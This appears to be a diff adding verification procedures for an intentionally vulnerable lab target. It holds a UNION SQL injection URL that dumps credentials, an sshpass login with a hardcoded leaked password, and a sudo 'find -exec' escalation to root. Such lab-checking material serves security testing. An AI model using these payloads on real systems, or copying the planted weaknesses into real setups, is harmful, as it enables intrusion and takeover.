@@ -1,0 +1,92 @@
+- entity_id: sqli_credential_leak
+  procedure:
+    sessions: []
+    procedure:
+    - step_id: exploit_union_sqli
+      session: null
+      action:
+        type: http_request
+        method: GET
+        url: http://${target_host}:${target_port}/index.php?search=x%27+UNION+SELECT+username%2Cpassword+FROM+users--+-
+        headers: {}
+        body: null
+      expect:
+        body_contains: sysadmin
+      outputs: {}
+      timeout: 10
+    - step_id: verify_password_exposed
+      session: null
+      action:
+        type: http_request
+        method: GET
+        url: http://${target_host}:${target_port}/index.php?search=x%27+UNION+SELECT+username%2Cpassword+FROM+users--+-
+        headers: {}
+        body: null
+      expect:
+        body_contains: Sup3rS3cr3tSSH!
+      outputs: {}
+      timeout: 10
+- entity_id: ssh_login_leaked_creds
+  procedure:
+    sessions: []
+    procedure:
+    - step_id: verify_ssh_service
+      session: null
+      action:
+        type: exec_target
+        command: service ssh status || /usr/sbin/sshd -t
+      expect:
+        exit_code: 0
+      outputs: {}
+      timeout: 10
+    - step_id: verify_sysadmin_user
+      session: null
+      action:
+        type: exec_target
+        command: id sysadmin
+      expect:
+        stdout_contains: sysadmin
+      outputs: {}
+      timeout: 10
+    - step_id: authenticate_ssh_and_verify
+      session: null
+      action:
+        type: exec_attacker
+        command: sshpass -p 'Sup3rS3cr3tSSH!' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10
+          -p 22 sysadmin@${target_host} 'id'
+      expect:
+        stdout_contains: uid=1000(sysadmin) gid=1000(sysadmin) groups=1000(sysadmin)
+      outputs: {}
+      timeout: 30
+- entity_id: sudo_privesc_root
+  procedure:
+    sessions: []
+    procedure:
+    - step_id: verify_sysadmin_exists
+      session: null
+      action:
+        type: exec_target
+        command: id sysadmin
+      expect:
+        stdout_contains: sysadmin
+      outputs: {}
+      timeout: 10
+    - step_id: verify_sudoers_entry
+      session: null
+      action:
+        type: exec_target
+        command: cat /etc/sudoers.d/sysadmin
+      expect:
+        stdout_contains: 'NOPASSWD: /usr/bin/find'
+      outputs: {}
+      timeout: 10
+    - step_id: exploit_sudo_find
+      session: null
+      action:
+        type: exec_target
+        command: sudo -u sysadmin sudo /usr/bin/find /. -maxdepth 0 -exec /bin/bash
+          -p -c 'id' \; -quit
+      expect:
+        stdout_contains: uid=0(root)
+      outputs: {}
+      timeout: 15
